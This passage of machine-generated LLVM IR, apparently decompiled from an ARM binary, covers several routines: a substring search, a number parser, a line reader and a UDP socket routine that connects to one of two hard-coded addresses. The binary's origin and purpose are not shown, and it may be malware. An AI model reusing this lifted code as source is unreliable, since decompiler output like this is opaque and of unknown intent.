  uselistorder i32 -34, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_ad48, { 2, 0, 1 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_ad10, { 1, 0 }
  uselistorder label %dec_label_pc_ace0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_acac, { 2, 1, 0 }
}

define i32 @function_ad54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ad54:
  %v7_ad60 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_ad60, label %.thread2, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_ad54
  store i32 %arg4, i32* @lr, align 4
  %v5_ada814 = icmp sgt i32 %arg2, 0
  br i1 %v5_ada814, label %dec_label_pc_ad78, label %dec_label_pc_adac

.thread2:                                         ; preds = %dec_label_pc_ad54
  store i32 %arg4, i32* @lr, align 4
  br label %dec_label_pc_adac

dec_label_pc_ad78:                                ; preds = %.thread3, %dec_label_pc_ada0
  %v0_ad98 = phi i32 [ %v1_ada0, %dec_label_pc_ada0 ], [ 0, %.thread3 ]
  %v0_ad84 = phi i32 [ %v1_ad84., %dec_label_pc_ada0 ], [ 0, %.thread3 ]
  %v2_ad78 = add i32 %v0_ad84, %arg3
  %v3_ad78 = inttoptr i32 %v2_ad78 to i8*
  %v4_ad78 = load i8, i8* %v3_ad78, align 1
  %v2_ad7c = add i32 %v0_ad98, %arg1
  %v3_ad7c = inttoptr i32 %v2_ad7c to i8*
  %v4_ad7c = load i8, i8* %v3_ad7c, align 1
  %v9_ad80 = icmp eq i8 %v4_ad7c, %v4_ad78
  %v1_ad84 = add i32 %v0_ad84, 1
  %v1_ad84. = select i1 %v9_ad80, i32 %v1_ad84, i32 0
  br i1 %v9_ad80, label %dec_label_pc_ad90, label %dec_label_pc_ada0

dec_label_pc_ad90:                                ; preds = %dec_label_pc_ad78
  %v9_ad90 = icmp eq i32 %v1_ad84., %arg4
  br i1 %v9_ad90, label %dec_label_pc_ad98, label %dec_label_pc_ada0

dec_label_pc_ad98:                                ; preds = %dec_label_pc_ad90
  %v1_ad98 = add i32 %v0_ad98, 1
  ret i32 %v1_ad98

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad90, %dec_label_pc_ad78
  %v1_ada0 = add nuw nsw i32 %v0_ad98, 1
  %v5_ada8 = icmp slt i32 %v1_ada0, %arg2
  br i1 %v5_ada8, label %dec_label_pc_ad78, label %dec_label_pc_adac

dec_label_pc_adac:                                ; preds = %dec_label_pc_ada0, %.thread3, %.thread2
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_ada0, { 1, 0 }
  uselistorder i32 %v1_ad84., { 1, 0 }
  uselistorder i1 %v9_ad80, { 1, 0 }
  uselistorder i32 %v0_ad84, { 1, 0 }
  uselistorder i32 %v0_ad98, { 2, 0, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_adac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_ad78, { 1, 0 }
}

define i32 @function_adb4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_adb4:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_adb4 = load i32, i32* @r4, align 4
  store i32 %v3_adb4, i32* %stack_var_-28, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_adc0

dec_label_pc_adc0:                                ; preds = %.thread, %dec_label_pc_add8, %bb, %dec_label_pc_adb4
  %v0_adc0 = phi i32 [ %tmp, %dec_label_pc_adb4 ], [ %v5_adc0, %bb ], [ %v5_adc0, %dec_label_pc_add8 ], [ %v5_adc0, %.thread ]
  %v1_adc0 = inttoptr i32 %v0_adc0 to i8*
  %v2_adc0 = load i8, i8* %v1_adc0, align 1
  %v3_adc0 = zext i8 %v2_adc0 to i32
  %v5_adc0 = add i32 %v0_adc0, 1
  store i32 %v5_adc0, i32* %r4.global-to-local, align 4
  %v7_adc8 = icmp eq i8 %v2_adc0, 9
  br i1 %v7_adc8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_adc0
  store i32 %v3_adc0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_adc0

bb:                                               ; preds = %dec_label_pc_adc0
  %v8_adcc = icmp eq i8 %v2_adc0, 32
  store i32 %v3_adc0, i32* %r6.global-to-local, align 4
  br i1 %v8_adcc, label %dec_label_pc_adc0, label %dec_label_pc_add8

dec_label_pc_add8:                                ; preds = %bb
  %v7_add8 = icmp eq i8 %v2_adc0, 10
  br i1 %v7_add8, label %dec_label_pc_adc0, label %dec_label_pc_aedc

dec_label_pc_adf4:                                ; preds = %dec_label_pc_aedc
  %v7_adf4 = icmp eq i8 %v2_adc0, 43
  br i1 %v7_adf4, label %bb48, label %dec_label_pc_ae04

bb48:                                             ; preds = %dec_label_pc_adf4
  %v2_adf8 = inttoptr i32 %v5_adc0 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r6.global-to-local, align 4
  %v6_adf8 = add i32 %v0_adc0, 2
  store i32 %v6_adf8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %bb48, %dec_label_pc_adf4, %dec_label_pc_aee4
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_aee4 ], [ 2147483647, %dec_label_pc_adf4 ], [ 2147483647, %bb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_aee4 ], [ 0, %dec_label_pc_adf4 ], [ 0, %bb48 ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  %v2_ae0c = call i32 @function_b5dc(i32 %storemerge1, i32 %arg2)
  %v0_ae10 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_ae10, i32* @r1, align 4
  store i32 %v2_ae0c, i32* %sl.global-to-local, align 4
  store i32 %storemerge1, i32* @r0, align 4
  %v0_ae1c = call i32 @function_b4cc()
  store i32 %v0_ae1c, i32* @lr, align 4
  %v0_ae2c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ae2c

dec_label_pc_ae2c:                                ; preds = %.thread8, %dec_label_pc_ae04
  %v2_aea811 = phi i32 [ %v1_aed426, %.thread8 ], [ 0, %dec_label_pc_ae04 ]
  %v1_ae84 = phi i32 [ %v0_aeb824, %.thread8 ], [ 0, %dec_label_pc_ae04 ]
  %v1_ae6c = phi i32 [ %v3_aeb0, %.thread8 ], [ %v0_ae2c.pre, %dec_label_pc_ae04 ]
  %v1_ae2c = urem i32 %v1_ae6c, 256
  %v1_ae30 = add nsw i32 %v1_ae2c, -48
  %v1_ae38 = add nsw i32 %v1_ae2c, -97
  %v1_ae3c = add i32 %v1_ae6c, -48
  %v1_ae40 = add nsw i32 %v1_ae2c, -65
  %tmp71 = icmp ult i32 %v1_ae30, 10
  br i1 %tmp71, label %dec_label_pc_ae70, label %dec_label_pc_ae48

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae2c
  %v2_ae48 = icmp ugt i32 %v1_ae40, 24
  %v7_ae48 = icmp eq i32 %v1_ae40, 25
  %v2_ae4c = xor i1 %v7_ae48, true
  %v3_ae4c = and i1 %v2_ae48, %v2_ae4c
  br i1 %v3_ae4c, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_ae48
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_ae48, %bb49
  %v0_ae6020 = phi i32 [ %v1_ae3c, %dec_label_pc_ae48 ], [ 0, %bb49 ]
  %v2_ae50 = xor i1 %v2_ae48, true
  %v3_ae50 = or i1 %v7_ae48, %v2_ae50
  br i1 %v3_ae50, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v0_ae60 = phi i32 [ %v0_ae6020, %bb50 ], [ 1, %bb51 ]
  br i1 %v3_ae4c, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  %v6_ae58 = icmp ugt i32 %v1_ae38, 24
  %v11_ae58 = icmp eq i32 %v1_ae38, 25
  br label %bb54

bb54:                                             ; preds = %bb52, %bb53
  %v1_ae5c = phi i1 [ %v7_ae48, %bb52 ], [ %v11_ae58, %bb53 ]
  %v0_ae5c = phi i1 [ %v2_ae48, %bb52 ], [ %v6_ae58, %bb53 ]
  %v2_ae5c = xor i1 %v1_ae5c, true
  %v3_ae5c = and i1 %v0_ae5c, %v2_ae5c
  br i1 %v3_ae5c, label %dec_label_pc_aeb8, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %bb54
  %v2_ae60 = icmp eq i32 %v0_ae60, 0
  %. = select i1 %v2_ae60, i32 87, i32 55
  %v2_ae6c = sub i32 %v1_ae6c, %.
  br label %dec_label_pc_ae70

dec_label_pc_ae70:                                ; preds = %dec_label_pc_ae2c, %dec_label_pc_ae60
  %v0_ae8434 = phi i32 [ %v1_ae40, %dec_label_pc_ae2c ], [ %., %dec_label_pc_ae60 ]
  %v3_aea812 = phi i32 [ %v1_ae3c, %dec_label_pc_ae2c ], [ %v2_ae6c, %dec_label_pc_ae60 ]
  %v1_ae70 = load i32, i32* %r7.global-to-local, align 4
  %v6_ae74 = icmp slt i32 %v3_aea812, %v1_ae70
  br i1 %v6_ae74, label %dec_label_pc_ae78, label %dec_label_pc_aeb8

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae70
  %v3_ae78 = icmp uge i32 %v2_aea811, %v0_ae1c
  %v9_ae78 = icmp eq i32 %v2_aea811, %v0_ae1c
  %v2_ae7c = xor i1 %v3_ae78, true
  %v3_ae7c = or i1 %v9_ae78, %v2_ae7c
  br i1 %v3_ae7c, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_ae78
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_ae78, %bb57
  %v0_ae8433 = phi i32 [ %v0_ae8434, %dec_label_pc_ae78 ], [ 0, %bb57 ]
  %v2_ae80 = xor i1 %v9_ae78, true
  %v3_ae80 = and i1 %v3_ae78, %v2_ae80
  br i1 %v3_ae80, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v0_ae84 = phi i32 [ %v0_ae8433, %bb58 ], [ 1, %bb59 ]
  %tmp72 = icmp slt i32 %v1_ae84, 0
  %v4_ae84 = zext i1 %tmp72 to i32
  %v5_ae84 = or i32 %v0_ae84, %v4_ae84
  %v7_ae84 = icmp eq i32 %v5_ae84, 0
  br i1 %v7_ae84, label %dec_label_pc_ae90, label %.thread8

dec_label_pc_ae90:                                ; preds = %bb60
  %v1_ae9c = load i32, i32* %sl.global-to-local, align 4
  %v7_aea0 = icmp sgt i32 %v3_aea812, %v1_ae9c
  br i1 %v7_aea0, label %bb63, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_ae90
  br label %bb64

bb63:                                             ; preds = %dec_label_pc_ae90
  %v2_aea4 = icmp eq i1 %v9_ae78, false
  br i1 %v2_aea4, label %bb64, label %.thread8

bb64:                                             ; preds = %bb63, %.thread5
  %v4_aea813 = mul i32 %v1_ae70, %v2_aea811
  %v5_aea814 = add i32 %v4_aea813, %v3_aea812
  br label %.thread8

.thread8:                                         ; preds = %bb63, %bb60, %bb64
  %v1_aed426 = phi i32 [ %v2_aea811, %bb63 ], [ %v2_aea811, %bb60 ], [ %v5_aea814, %bb64 ]
  %v0_aeb824 = phi i32 [ -1, %bb63 ], [ -1, %bb60 ], [ 1, %bb64 ]
  %v0_aeb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_aeb0 = inttoptr i32 %v0_aeb0 to i8*
  %v2_aeb0 = load i8, i8* %v1_aeb0, align 1
  %v3_aeb0 = zext i8 %v2_aeb0 to i32
  store i32 %v3_aeb0, i32* %r6.global-to-local, align 4
  %v5_aeb0 = add i32 %v0_aeb0, 1
  store i32 %v5_aeb0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ae2c

dec_label_pc_aeb8:                                ; preds = %dec_label_pc_ae70, %bb54
  %v1_aeb8 = icmp slt i32 %v1_ae84, 0
  %v0_aec0 = load i32, i32* %r8.global-to-local, align 4
  %v2_aec0 = icmp eq i32 %v0_aec0, 0
  br i1 %v1_aeb8, label %dec_label_pc_aec0, label %dec_label_pc_aed0

dec_label_pc_aec0:                                ; preds = %dec_label_pc_aeb8
  %.70 = select i1 %v2_aec0, i32 2147483647, i32 -2147483648
  %v2_aecc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_aecc, i32* @r4, align 4
  ret i32 %.70

dec_label_pc_aed0:                                ; preds = %dec_label_pc_aeb8
  br i1 %v2_aec0, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_aed0
  %v2_aed4 = sub i32 0, %v2_aea811
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_aed0, %bb67
  %v23_aed8 = phi i32 [ %v2_aea811, %dec_label_pc_aed0 ], [ %v2_aed4, %bb67 ]
  %v2_aed8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_aed8, i32* @r4, align 4
  ret i32 %v23_aed8

dec_label_pc_aedc:                                ; preds = %dec_label_pc_add8
  %v7_aedc = icmp eq i8 %v2_adc0, 45
  br i1 %v7_aedc, label %dec_label_pc_aee4, label %dec_label_pc_adf4

dec_label_pc_aee4:                                ; preds = %dec_label_pc_aedc
  %v1_ade4 = inttoptr i32 %v5_adc0 to i8*
  %v2_ade4 = load i8, i8* %v1_ade4, align 1
  %v3_ade4 = zext i8 %v2_ade4 to i32
  store i32 %v3_ade4, i32* %r6.global-to-local, align 4
  %v5_ade4 = add i32 %v0_adc0, 2
  store i32 %v5_ade4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ae04

; uselistorder directives
  uselistorder i1 %v2_aec0, { 1, 0 }
  uselistorder i32 %v3_aeb0, { 1, 0 }
  uselistorder i1 %v9_ae78, { 1, 0, 2 }
  uselistorder i1 %v3_ae78, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_ae48, { 1, 2, 0 }
  uselistorder i1 %v2_ae48, { 1, 0, 2 }
  uselistorder i32 %v1_ae2c, { 1, 2, 0 }
  uselistorder i32 %v1_ae6c, { 1, 2, 0 }
  uselistorder i32 %v1_ae84, { 1, 0 }
  uselistorder i32 %v2_aea811, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_ae1c, { 1, 0, 2 }
  uselistorder i32 %v5_adc0, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v3_adc0, { 1, 0 }
  uselistorder i8 %v2_adc0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_adc0, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 5, 3, 2, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 4, 1, 2, 3 }
  uselistorder i8 32, { 1, 2, 0, 3 }
  uselistorder i8 9, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %dec_label_pc_ae70, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_adc0, { 1, 2, 0, 3 }
}

define i32 @function_aee8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_aee8:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_aee8 = load i32, i32* @r4, align 4
  store i32 %v3_aee8, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_af00

dec_label_pc_af00:                                ; preds = %dec_label_pc_af2c.dec_label_pc_af00_crit_edge, %dec_label_pc_aee8
  %v0_af04 = phi i32 [ %v0_af04.pre, %dec_label_pc_af2c.dec_label_pc_af00_crit_edge ], [ %arg3, %dec_label_pc_aee8 ]
  %v0_af00 = phi i32 [ %v1_af18, %dec_label_pc_af2c.dec_label_pc_af00_crit_edge ], [ %tmp, %dec_label_pc_aee8 ]
  %tmp12 = inttoptr i32 %v0_af00 to i32*
  %v5_af0c = call i32 @function_ba1c(i32 %v0_af04, i32* %tmp12, i32 1)
  %v7_af10 = icmp eq i32 %v5_af0c, 1
  %v0_af14 = load i32, i32* @r4, align 4
  %v1_af18 = add i32 %v0_af14, 1
  store i32 %v1_af18, i32* @r4, align 4
  %v0_af20 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_af10, label %dec_label_pc_af20, label %dec_label_pc_af38

dec_label_pc_af20:                                ; preds = %dec_label_pc_af00
  %v1_af20 = add i32 %v0_af20, 1
  store i32 %v1_af20, i32* %r5.global-to-local, align 4
  %v1_af24 = load i32, i32* %r8.global-to-local, align 4
  %v6_af28 = icmp slt i32 %v1_af20, %v1_af24
  br i1 %v6_af28, label %dec_label_pc_af2c, label %dec_label_pc_af38

dec_label_pc_af2c:                                ; preds = %dec_label_pc_af20
  %v1_af2c = inttoptr i32 %v0_af14 to i8*
  %v2_af2c = load i8, i8* %v1_af2c, align 1
  %v7_af30 = icmp eq i8 %v2_af2c, 10
  br i1 %v7_af30, label %dec_label_pc_af38, label %dec_label_pc_af2c.dec_label_pc_af00_crit_edge

dec_label_pc_af2c.dec_label_pc_af00_crit_edge:    ; preds = %dec_label_pc_af2c
  %v0_af04.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_af00

dec_label_pc_af38:                                ; preds = %dec_label_pc_af00, %dec_label_pc_af2c, %dec_label_pc_af20
  %v0_af38 = phi i32 [ %v1_af20, %dec_label_pc_af2c ], [ %v1_af20, %dec_label_pc_af20 ], [ %v0_af20, %dec_label_pc_af00 ]
  %v2_af38 = icmp eq i32 %v0_af38, 0
  %v1_af3c = load i32, i32* %r6.global-to-local, align 4
  %storemerge = select i1 %v2_af38, i32 0, i32 %v1_af3c
  %v2_af44 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_af44, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_af18, { 1, 0 }
  uselistorder i8 10, { 1, 0 }
  uselistorder label %dec_label_pc_af38, { 1, 2, 0 }
}

define i32 @function_af48() local_unnamed_addr {
dec_label_pc_af48:
  %v0_af4c = call i32 @function_939c()
  %v1_af50 = urem i32 %v0_af4c, 2
  %v2_af50 = icmp eq i32 %v1_af50, 0
  br i1 %v2_af50, label %dec_label_pc_af6c, label %dec_label_pc_af5c

dec_label_pc_af5c:                                ; preds = %dec_label_pc_af48
  br label %dec_label_pc_af6c

dec_label_pc_af6c:                                ; preds = %dec_label_pc_af48, %dec_label_pc_af5c
  %v0_af6c = phi i32 [ -1740966483, %dec_label_pc_af48 ], [ -1136921171, %dec_label_pc_af5c ]
  ret i32 %v0_af6c

; uselistorder directives
  uselistorder i32 ()* @function_939c, { 5, 4, 9, 8, 7, 6, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_af6c, { 1, 0 }
}

define i32 @function_af74() local_unnamed_addr {
dec_label_pc_af74:
  br i1 true, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_af74
  %v4_af74 = load i32, i32* @sl, align 4
  %v5_af74 = inttoptr i32 %v4_af74 to i32*
  %v6_af74 = load i32, i32* %v5_af74, align 4
  %v34_af74 = add i32 %v4_af74, -40
  %v35_af74 = inttoptr i32 %v34_af74 to i32*
  %v36_af74 = load i32, i32* %v35_af74, align 4
  call void @__pseudo_branch(i32 %v36_af74)
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_af74, %bb
  %.0 = phi i32 [ %v6_af74, %bb ], [ undef, %dec_label_pc_af74 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32* @sl, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_af7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_af7c:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_af7c = load i32, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v3_af9c = call i32 @function_c0a8(i32 2, i32 2, i32 0)
  %v7_afa0 = icmp eq i32 %v3_af9c, -1
  store i32 %v3_af9c, i32* @r4, align 4
  br i1 %v7_afa0, label %dec_label_pc_b008, label %dec_label_pc_afb4

dec_label_pc_afb4:                                ; preds = %dec_label_pc_af7c
  store i32 2, i32* %stack_var_-40, align 4
  %v0_afc0 = call i32 @function_af48()
  %v0_afd4 = call i32 @function_bdd4()
  %v0_afd8 = load i32, i32* %r6.global-to-local, align 4
  %v0_afdc = load i32, i32* %r5.global-to-local, align 4
  %v2_afdc = inttoptr i32 %v0_afd4 to i32*
  store i32 %v0_afdc, i32* %v2_afdc, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe8 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_afe8 = call i32 @function_bf38(i32 %v0_afe4, %sockaddr* %v3_afe8, i32 %v0_afd8)
  %v2_aff0 = ptrtoint i32* %stack_var_-24 to i32
  %v0_aff4 = load i32, i32* @r4, align 4
  %v4_aff8 = call i32 @function_bf64(i32 %v0_aff4, %sockaddr* %v3_afe8, i32 %v2_aff0)
  %v0_affc = load i32, i32* @r4, align 4
  %v1_b000 = call i32 @function_b880(i32 %v0_affc)
  br label %dec_label_pc_b008

dec_label_pc_b008:                                ; preds = %dec_label_pc_af7c, %dec_label_pc_afb4
  %v17_b00c = phi i32 [ 0, %dec_label_pc_af7c ], [ %v0_afc0, %dec_label_pc_afb4 ]
  store i32 %v3_af7c, i32* @r4, align 4
  ret i32 %v17_b00c

; uselistorder directives
  uselistorder i32 %v3_af9c, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_bf38, { 1, 0, 2, 3, 4 }
  uselistorder i32 ()* @function_af48, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_c0a8, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_b008, { 1, 0 }
}

define i32 @function_b010(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b010:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg2 to i8
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %tmp3, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i8, align 1
  store i32 %tmp3, i32* %ip.global-to-local, align 4
  %v2_b014 = icmp eq i32* %arg1, null
  store i32 1, i32* %r0.global-to-local, align 4
  store i8 %tmp, i8* %stack_var_-8, align 1
  br i1 %v2_b014, label %dec_label_pc_b044, label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_b010
  %v2_b02c = load i32, i32* %arg1, align 4
  %v4_b030 = inttoptr i32 %v2_b02c to i8*
  store i8 %tmp, i8* %v4_b030, align 1
  %v0_b034 = load i32, i32* %ip.global-to-local, align 4
  %v1_b034 = inttoptr i32 %v0_b034 to i32*
  %v2_b034 = load i32, i32* %v1_b034, align 4
  %v1_b038 = load i32, i32* %r0.global-to-local, align 4
  %v2_b038 = add i32 %v1_b038, %v2_b034
  store i32 %v2_b038, i32* %v1_b034, align 4
  %v5_b050.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b04c

dec_label_pc_b044:                                ; preds = %dec_label_pc_b010
  %v3_b048 = bitcast i8* %stack_var_-8 to i32*
  %v4_b048 = call i32 @function_bb28(i32 1, i32* %v3_b048, i32 1)
  store i32 %v4_b048, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b04c

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b02c, %dec_label_pc_b044
  %v5_b050 = phi i32 [ %v5_b050.pre, %dec_label_pc_b02c ], [ %v4_b048, %dec_label_pc_b044 ]
  ret i32 %v5_b050

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_b04c, { 1, 0 }
}

define i32 @function_b054(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b054:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_b054 = load i32, i32* @r4, align 4
  store i32 %v3_b054, i32* %stack_var_-24, align 4
  %v0_b058 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_b058, i32* @r4, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp50 = icmp slt i32 %v0_b058, 1
  br i1 %tmp50, label %dec_label_pc_b098, label %dec_label_pc_b074.preheader

dec_label_pc_b074.preheader:                      ; preds = %dec_label_pc_b054
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_b07422 = load i8, i8* %arg2, align 1
  %v2_b07824 = icmp eq i8 %v4_b07422, 0
  br i1 %v2_b07824, label %dec_label_pc_b080, label %dec_label_pc_b070

dec_label_pc_b070:                                ; preds = %dec_label_pc_b074.preheader, %dec_label_pc_b070
  %v0_b08026 = phi i32 [ %v1_b070, %dec_label_pc_b070 ], [ 0, %dec_label_pc_b074.preheader ]
  %v1_b070 = add i32 %v0_b08026, 1
  store i32 %v1_b070, i32* %r2.global-to-local, align 4
  %v2_b074 = add i32 %v1_b070, %tmp
  %v3_b074 = inttoptr i32 %v2_b074 to i8*
  %v4_b074 = load i8, i8* %v3_b074, align 1
  %v2_b078 = icmp eq i8 %v4_b074, 0
  br i1 %v2_b078, label %dec_label_pc_b080, label %dec_label_pc_b070

dec_label_pc_b080:                                ; preds = %dec_label_pc_b070, %dec_label_pc_b074.preheader
  %v6_b0842.in = phi i8 [ %v4_b07422, %dec_label_pc_b074.preheader ], [ %v4_b074, %dec_label_pc_b070 ]
  %v6_b088 = phi i32 [ 0, %dec_label_pc_b074.preheader ], [ %v1_b070, %dec_label_pc_b070 ]
  %v6_b0842 = zext i8 %v6_b0842.in to i32
  %v5_b084 = icmp sgt i32 %v0_b058, %v6_b088
  %v8_b088 = sub i32 %v0_b058, %v6_b088
  %v8_b088.v6_b0842 = select i1 %v5_b084, i32 %v8_b088, i32 %v6_b0842
  store i32 %v8_b088.v6_b0842, i32* @r4, align 4
  %v1_b08c = and i32 %arg4, 2
  %v2_b08c = icmp eq i32 %v1_b08c, 0
  br i1 %v2_b08c, label %dec_label_pc_b098, label %dec_label_pc_b09c

dec_label_pc_b098:                                ; preds = %dec_label_pc_b054, %dec_label_pc_b080
  %v0_b0bc732 = phi i32 [ %v8_b088.v6_b0842, %dec_label_pc_b080 ], [ %v0_b058, %dec_label_pc_b054 ]
  br label %dec_label_pc_b09c

dec_label_pc_b09c:                                ; preds = %dec_label_pc_b080, %dec_label_pc_b098
  %v0_b0bc7 = phi i32 [ %v0_b0bc732, %dec_label_pc_b098 ], [ %v8_b088.v6_b0842, %dec_label_pc_b080 ]
  %storemerge = phi i32 [ 32, %dec_label_pc_b098 ], [ 48, %dec_label_pc_b080 ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  %v1_b09c = urem i32 %arg4, 2
  %v2_b09c = icmp eq i32 %v1_b09c, 0
  store i32 0, i32* %r6.global-to-local, align 4
  br i1 %v2_b09c, label %dec_label_pc_b0bc.preheader, label %dec_label_pc_b0d8.preheader

dec_label_pc_b0bc.preheader:                      ; preds = %dec_label_pc_b09c
  %tmp51 = icmp slt i32 %v0_b0bc7, 1
  br i1 %tmp51, label %dec_label_pc_b0d8.preheader, label %dec_label_pc_b0b0

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b0bc.preheader, %dec_label_pc_b0b0
  %v0_b0c417 = phi i32 [ %v0_b0c4, %dec_label_pc_b0b0 ], [ %storemerge, %dec_label_pc_b0bc.preheader ]
  %v0_b0c016 = phi i32 [ %v0_b0c0, %dec_label_pc_b0b0 ], [ %arg1, %dec_label_pc_b0bc.preheader ]
  %v2_b0b0 = inttoptr i32 %v0_b0c016 to i32*
  %v3_b0b0 = call i32 @function_b010(i32* %v2_b0b0, i32 %v0_b0c417)
